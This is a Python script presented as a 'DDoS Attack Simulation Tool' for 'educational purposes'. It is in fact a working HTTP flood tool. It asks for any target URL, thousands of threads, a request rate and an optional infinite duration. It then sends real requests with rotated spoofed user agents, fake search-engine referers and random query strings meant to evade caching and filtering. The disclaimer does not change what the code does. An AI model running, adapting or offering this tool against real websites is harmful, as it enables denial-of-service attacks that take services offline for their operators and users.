import os
import requests
import random
import time
import logging
import signal
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse


class DDOSAttackSimulator:

    def __init__(self):
        self.running = True
        self.setup_signal_handlers()
        self.setup_logging()

    def setup_logging(self):
        """Configure logging with timestamp formatting"""
        logging.basicConfig(level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s',
                            handlers=[
                                logging.StreamHandler(sys.stdout),
                                logging.FileHandler('attack_simulation.log')
                            ])

    def setup_signal_handlers(self):
        """Handle graceful shutdown on Ctrl+C"""
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def signal_handler(self, signum, frame):
        """Gracefully handle interrupt signals"""
        logging.info("Received interrupt signal. Shutting down gracefully...")
        self.running = False
        sys.exit(0)

    def clear_screen(self):
        """Clear terminal screen cross-platform"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def validate_url(self, url):
        """Validate and format URL properly"""
        if not url:
            raise ValueError("URL cannot be empty")

        # Add protocol if missing
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url

        # Validate URL structure
        parsed = urlparse(url)
        if not parsed.netloc:
            raise ValueError("Invalid URL format")

        return url

    def get_user_input(self):
        """Get and validate user inputs"""
        try:
            url = input("Target URL: ").strip()
            url = self.validate_url(url)

            num_threads = int(input("Number of threads (1-10000): ").strip())
            if not 1 <= num_threads <= 10000:
                raise ValueError("Thread count must be between 1 and 1000")

            request_rate = float(
                input("Requests per second (0.1-10000): ").strip())
            if not 0.1 <= request_rate <= 10000:
                raise ValueError("Request rate must be between 0.1 and 10000")

            duration = float(
                input("Duration in seconds (0 for infinite): ").strip())
            if duration < 0:
                raise ValueError("Duration cannot be negative")

            return url, num_threads, request_rate, duration
        except ValueError as e:
            logging.error(f"Input error: {e}")
            sys.exit(1)
        except KeyboardInterrupt:
            logging.info("Cancelled by user")
            sys.exit(0)

    def get_user_agents(self):
        """Return list of user agent strings"""
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/89.0"
        ]

    def get_referers(self):
        """Return list of referer URLs"""
        return [
            "https://www.google.com/", "https://www.bing.com/",
            "https://duckduckgo.com/", "https://www.yahoo.com/",
            "https://www.baidu.com/", "https://yandex.com/",
            "https://ecosia.org/", "https://ask.com/"
        ]

    def generate_random_string(self, size=5):
        """Generate random string of specified length"""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choice(chars) for _ in range(size))

    def make_request(self, target_url, session):
        """Make a single HTTP request with random parameters"""
        if not self.running:
            return False

        try:
            headers = {
                'User-Agent': random.choice(self.get_user_agents()),
                'Referer': random.choice(self.get_referers()),
                'Accept':
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }

            # Add random query parameters
            params = {
                self.generate_random_string(random.randint(3, 10)):
                self.generate_random_string(random.randint(5, 15))
                for _ in range(random.randint(1, 5))
            }

            # Make request
            response = session.get(target_url,
                                   headers=headers,
                                   params=params,
                                   timeout=10)

            if response.status_code == 200:
                logging.info(
                    f"Success: {response.status_code} - {response.elapsed.total_seconds():.2f}s"
                )
            else:
                logging.warning(f"Response: {response.status_code}")

            return True

        except requests.exceptions.Timeout:
            logging.error("Request timed out")
        except requests.exceptions.ConnectionError:
            logging.error("Connection error - server may be down")
        except requests.exceptions.RequestException as e:
            logging.error(f"Request error: {type(e).__name__}")
        except Exception as e:
            logging.error(f"Unexpected error: {type(e).__name__}")

        return False

    def worker(self, target_url, request_rate, duration):
        """Worker thread function"""
        session = requests.Session()
        start_time = time.time()

        while self.running:
            if duration > 0 and (time.time() - start_time) >= duration:
                break

            success = self.make_request(target_url, session)
            if not success:
                time.sleep(1)  # Back off on errors

            # Control request rate
            if request_rate > 0:
                time.sleep(1.0 / request_rate)

    def run_attack(self, target_url, num_threads, request_rate, duration):
        """Execute the attack simulation with multiple threads"""
        logging.info(f"Starting attack on {target_url}")
        logging.info(
            f"Threads: {num_threads}, Rate: {request_rate}/sec, Duration: {duration if duration > 0 else 'infinite'}"
        )

        start_time = time.time()
        completed_requests = 0

        try:
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                # Submit all worker tasks
                futures = [
                    executor.submit(self.worker, target_url, request_rate,
                                    duration) for _ in range(num_threads)
                ]

                # Wait for completion or interruption
                for future in as_completed(futures, timeout=None):
                    try:
                        future.result()
                        completed_requests += 1
                    except Exception as e:
                        logging.error(f"Worker error: {e}")

                    if not self.running:
                        break

        except KeyboardInterrupt:
            logging.info("Interrupted by user")
        except Exception as e:
            logging.error(f"Attack error: {e}")
        finally:
            elapsed = time.time() - start_time
            logging.info(f"Attack finished. Duration: {elapsed:.2f}s")

    def run(self):
        """Main execution method"""
        self.clear_screen()
        print("=" * 50)
        print("      DDoS Attack Simulation Tool")
        print("         Educational Purposes Only")
        print("=" * 50)

        try:
            url, threads, rate, duration = self.get_user_input()
            self.run_attack(url, threads, rate, duration)
        except Exception as e:
            logging.error(f"Application error: {e}")
        finally:
            logging.info("Program terminated")


if __name__ == "__main__":
    simulator = DDOSAttackSimulator()
    simulator.run()
